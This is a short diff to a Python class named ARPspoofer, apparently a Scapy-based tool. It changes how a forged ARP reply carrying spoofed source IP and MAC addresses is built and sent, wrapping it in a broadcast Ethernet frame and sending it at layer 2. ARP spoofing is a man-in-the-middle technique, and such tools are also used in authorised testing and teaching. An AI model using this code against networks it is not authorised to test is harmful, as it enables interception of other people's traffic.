@@ -185,13 +185,13 @@ class ARPspoofer(threading.Thread):
                     source_ip, source_mac, destination_ip, destination_mac)
             )
 
-        pkt = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
+        pkt = Ether('ff:ff:ff:ff:ff:ff') / ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                      psrc=source_ip, hwsrc=source_mac)
 
         if verbose:
             logger.debug('Packet created: {}'.format(pkt.show(dump=True)))
 
-        send(pkt, verbose=0)
+        sendp(pkt, verbose=0)
 
     def __execute_cmd(self, cmd):
         """
